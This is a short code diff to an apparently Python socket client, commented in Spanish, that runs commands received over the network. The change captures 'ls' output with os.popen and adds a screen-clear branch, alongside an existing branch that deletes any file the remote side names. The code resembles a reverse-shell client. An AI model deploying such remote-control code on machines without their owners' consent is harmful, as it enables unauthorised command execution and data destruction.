@@ -26,11 +26,16 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as cliente:
             if os.name in ['ce','nt','dos']:
                resultado = subprocess.check_output('powershell ls', shell=True).decode()
             else:
-                resultado = os.system('ls')
+                resultado = os.popen('ls').read()
         elif cmd in ['rm','del']:
             cmd = cmd[cmd.find(' ')+1:]
             os.remove(cmd)
             resultado = f'Se elimino {cmd}'
+        elif cmd in ['clear','cls']:
+            if os.name in ['ce','nt','dos']:
+                resultado = os.popen('cls').read()
+            else:
+                resultado = os.popen('clear').read()
         elif cmd == 'exit':
             break
         else:
